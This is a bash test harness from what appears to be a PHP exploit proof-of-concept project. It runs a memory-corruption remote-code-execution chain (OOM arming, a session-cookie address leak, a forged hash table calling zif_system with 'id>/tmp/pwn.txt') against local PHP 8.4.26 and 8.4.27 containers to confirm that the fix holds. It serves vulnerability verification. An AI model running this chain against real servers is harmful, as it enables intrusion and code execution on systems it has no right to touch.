#!/bin/bash
# SPDX-License-Identifier: MIT
# Copyright (c) 2026 GG ADVANCED IT Security UG

# negative_control.sh - the paired experiment: the chain must work on 8.4.26 and must not on 8.4.27.
#
# A negative control is only worth something next to a positive one on the same host with the same
# tools and the same arguments, so this runs both arms and prints them side by side. It also refuses
# to call a failure "proof of a fix" unless the target is demonstrably healthy.
#
# Coverage, matching docs/NEGATIVE_CONTROL_8.4.27.md:
#   1. target healthy        200 OK, PHP version, ini settings
#   2. A1 arms?              OOM site from the container log, PS(id) afterwards
#   3. B1 discloses?         Set-Cookie length (32 = a normal session id, >4096 = a disclosure window)
#   4. addresses derivable?  leak_addrs exit status
#   5. B2 executes?          proof file, response size, worker crash
#
# usage:
#   ./poc/negative_control.sh                  # both arms
#   ./poc/negative_control.sh --negative-only
set -u

HERE=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
ROOT=$(cd "$HERE/.." && pwd)
cd "$ROOT" || exit 1

POS_IMAGE=${POS_IMAGE:-php@sha256:60111400ff77bdc44fa79b4f072afe49a42abba71e0846ad496be4761dc9c11a}
NEG_IMAGE=${NEG_IMAGE:-php:8.4.27-apache}
POS_NAME=p2s-nc-pos
NEG_NAME=p2s-nc-neg
POS_PORT=${POS_PORT:-18120}
NEG_PORT=${NEG_PORT:-18121}
SPEC="G:511:0x137*14,G:400:0x137,X:900"
CMD='id>/tmp/pwn.txt'
NEGATIVE_ONLY=0
SWEEPS=1
for arg in "$@"; do
  case "$arg" in
    --negative-only) NEGATIVE_ONLY=1 ;;
    --no-sweeps) SWEEPS=0 ;;
    *) echo "usage: $0 [--negative-only] [--no-sweeps]" >&2; exit 2 ;;
  esac
done
SWEEP_LIMITS=${SWEEP_LIMITS:-"96M 128M 192M 256M 384M"}

command -v docker >/dev/null 2>&1 || { echo "docker not found" >&2; exit 1; }
command -v sudo >/dev/null 2>&1 || true

# port_owner <port> - name of a running container already publishing this host port, if any.
# A collision here is invisible inside the exploit (the requests would hit someone else's target and
# "work"), so it has to be caught before either arm starts.
port_owner() {
  docker ps --format '{{.Names}} {{.Ports}}' | awk -v p=":$1->" '$0 ~ p {print $1; exit}'
}

start() {
  local name="$1" port="$3" owner
  owner=$(port_owner "$port")
  if [ -n "$owner" ]; then
    echo "host port $port is already published by container '$owner'; stop it or pass another port" >&2
    exit 1
  fi
  IMAGE="$1" NAME="$2" PORT="$3" bash lab/start_target.sh --single >/dev/null 2>&1
  sleep 2
  if ! docker inspect "$2" >/dev/null 2>&1; then
    echo "container '$2' did not start; run lab/start_target.sh by hand to see why" >&2
    exit 1
  fi
}
worker_pid() { sudo pgrep -P "$(docker inspect -f '{{.State.Pid}}' "$1" 2>/dev/null)" 2>/dev/null | head -1; }
oom_in_log() { docker logs --tail 8 "$1" 2>&1 | grep -oE 'tried to allocate [0-9]+' | sort -u | tr '\n' ' '; }

# arm_leak <name> <port> <cookie-file>
# Prints the Set-Cookie length and the leak_addrs exit status.
arm_leak() {
  local name="$1" port="$2" cookie="$3" target="http://127.0.0.1:$2/index.php"
  python3 poc/a1_arm.py --url "$target" --repeat 1 --sid-hex 00 --big 78 \
          --query-n 5 --query-len 1 --timeout 120 >/dev/null 2>&1
  sleep 1
  local len
  len=$(python3 poc/b1_forge.py --url "$target" --spec "$SPEC" --fake-len 0xC8000 \
          --sid a --progress-first --chunked --save-cookie "$cookie" 2>/dev/null \
        | sed -n 's/^Set-Cookie: \([0-9]*\) chars/\1/p')
  echo "${len:-0}"
}

# execute <name> <port> <cookie> <use-leak|use-gdb>
execute_stage() {
  local name="$1" port="$2" cookie="$3" how="$4" target="http://127.0.0.1:$2/index.php"
  local zif main s
  if [ "$how" = use-leak ]; then
    eval "$(python3 poc/leak_addrs.py --cookie-file "$cookie" --emit shell)" || return 1
    zif="$ZIF_SYSTEM"; s="$S"
  else
    # Addresses measured on the target's own build, so a failure cannot be blamed on wrong numbers.
    local pid
    pid=$(worker_pid "$name")
    [ -z "$pid" ] && return 1
    zif=$(sudo gdb -q -batch -p "$pid" -ex 'p/x &zif_system' 2>/dev/null | grep -oE '0x[0-9a-f]+' | tail -1)
    main=$(sudo gdb -q -batch -p "$pid" -x gdb/chain_state.gdb 2>/dev/null \
           | grep -oE 'main=0x[0-9a-f]+' | head -1 | cut -d= -f2)
    [ -z "$zif" ] && return 1
    s=$(printf '0x%x' $(( main + 0xF8398 )))
  fi
  python3 poc/a2_cheap_oom.py --url "$target" --parts 880 --depth 64 --fillers 115 >/dev/null 2>&1
  sleep 1
  python3 poc/mk_fake_ht.py --ht "$s" --zif "$zif" --cmd "$CMD" --out /tmp/nc_ht.bin >/dev/null || return 1
  python3 poc/b2_exec.py --url "$target" --ht-addr "$s" --ht-file /tmp/nc_ht.bin \
          --vl 384 --n1 500 --n2 495 --rc 1 >/dev/null 2>&1
  sleep 2
  echo "zif=$zif S=$s"
}

report() {
  local name="$1" label="$2" cookie="$3" cookie_len="$4" leak_rc="$5" exec_out="$6"
  local php_version proof segv
  if ! docker inspect "$name" >/dev/null 2>&1; then
    echo "----------------------------------------------------------------"
    echo "$label"
    echo "  container $name is missing - the arm did not run"
    return
  fi
  php_version=$(docker exec "$name" php -v 2>/dev/null | head -1 | cut -d' ' -f2)
  proof=$(docker exec "$name" cat /tmp/pwn.txt 2>/dev/null | head -1)
  segv=$(docker logs --tail 10 "$name" 2>&1 | grep -c 'Segmentation fault')
  echo "----------------------------------------------------------------"
  echo "$label"
  echo "  php                : $php_version"
  echo "  OOM in the log     : [$(oom_in_log "$name")]  (empty = nothing exhausted memory)"
  echo "  B1 Set-Cookie      : $cookie_len chars  $([ "${cookie_len:-0}" -gt 4096 ] && echo '(disclosure window)' || echo '(normal session id)')"
  echo "  leak_addrs         : $([ "$leak_rc" -eq 0 ] && echo 'derived addresses' || echo 'refused (fail-closed)')"
  echo "  B2 with addresses  : $exec_out"
  echo "  proof file         : ${proof:-<none>}"
  echo "  worker segfaults   : $segv"
}

echo "================ php2shell negative control ================"
echo "positive arm : $POS_IMAGE"
echo "negative arm : $NEG_IMAGE"
echo

if [ "$NEGATIVE_ONLY" -eq 0 ]; then
  start "$POS_IMAGE" "$POS_NAME" "$POS_PORT"
  pos_cookie=/tmp/nc_pos.cookie
  pos_len=$(arm_leak "$POS_NAME" "$POS_PORT" "$pos_cookie")
  python3 poc/leak_addrs.py --cookie-file "$pos_cookie" >/dev/null 2>&1; pos_rc=$?
  pos_exec=$(execute_stage "$POS_NAME" "$POS_PORT" "$pos_cookie" use-leak)
  report "$POS_NAME" "POSITIVE ARM (the chain must land)" "$pos_cookie" "$pos_len" "$pos_rc" "${pos_exec:-<stage failed>}"
  echo
fi

start "$NEG_IMAGE" "$NEG_NAME" "$NEG_PORT"
neg_cookie=/tmp/nc_neg.cookie
neg_len=$(arm_leak "$NEG_NAME" "$NEG_PORT" "$neg_cookie")
python3 poc/leak_addrs.py --cookie-file "$neg_cookie" >/dev/null 2>&1; neg_rc=$?
neg_exec=$(execute_stage "$NEG_NAME" "$NEG_PORT" "$neg_cookie" use-gdb)
report "$NEG_NAME" "NEGATIVE ARM (nothing may happen, even with true addresses)" "$neg_cookie" "$neg_len" "$neg_rc" "${neg_exec:-<stage failed>}"

echo "----------------------------------------------------------------"
echo "verdict: a failure on the negative arm means something only when the positive arm passed and the"
echo "         negative target answered 200 OK with the same ini settings. See"
echo "         docs/NEGATIVE_CONTROL_8.4.27.md for the full protocol."

# ---------------------------------------------------------------- memory-limit sweep
# "It failed because the arming needs a tighter budget" is the strongest objection to a negative
# result, so both images are swept over the limit with a fresh container each time (a dirty heap would
# invalidate the arming). The positive arm must react to the limit for this measurement to mean
# anything: if it arms at one limit and not at others, the sweep is sensitive, and the negative arm
# staying silent across the same range is then evidence rather than a coincidence.
if [ "$SWEEPS" -eq 1 ]; then
  echo
  echo "================ memory-limit sweep (fresh container per point) ================"
  printf '%-8s %-34s %-34s\n' "limit" "positive: 8.4.26" "negative: 8.4.27"
  for lim in $SWEEP_LIMITS; do
    row_pos="-"
    row_neg="-"
    for arm in pos neg; do
      if [ "$arm" = pos ]; then
        [ "$NEGATIVE_ONLY" -eq 1 ] && continue
        img="$POS_IMAGE"; name="$POS_NAME"; port="$POS_PORT"
      else
        img="$NEG_IMAGE"; name="$NEG_NAME"; port="$NEG_PORT"
      fi
      docker rm -f "$name" >/dev/null 2>&1
      IMAGE="$img" NAME="$name" PORT="$port" bash lab/start_target.sh --single >/dev/null 2>&1
      docker exec "$name" sed -i "s/^memory_limit = .*/memory_limit = $lim/" \
        /usr/local/etc/php/php.ini 2>/dev/null
      docker exec "$name" apache2ctl graceful >/dev/null 2>&1
      sleep 1
      python3 poc/a1_arm.py --url "http://127.0.0.1:$port/index.php" --repeat 1 --sid-hex 00 \
              --big 78 --query-n 5 --query-len 1 --timeout 180 >/dev/null 2>&1
      oom=$(oom_in_log "$name")
      status=$(docker logs --tail 2 "$name" 2>&1 | grep -oE '" [0-9]{3} ' | tail -1 | tr -d '" ')
      if [ -n "$oom" ]; then
        cell="OOM ${oom}"
      else
        cell="no OOM (${status:-200})"
      fi
      if [ "$arm" = pos ]; then row_pos="$cell"; else row_neg="$cell"; fi
    done
    printf '%-8s %-34s %-34s\n' "$lim" "$row_pos" "$row_neg"
  done
  echo
  echo "reading the table: the positive arm is sensitive to the limit (it arms only when the budget is"
  echo "tight enough, and stops arming once there is room), so silence on the negative arm across the"
  echo "same range is not an artefact of the budget. 8.4.27 never produces the 4096 encode-site OOM."
fi
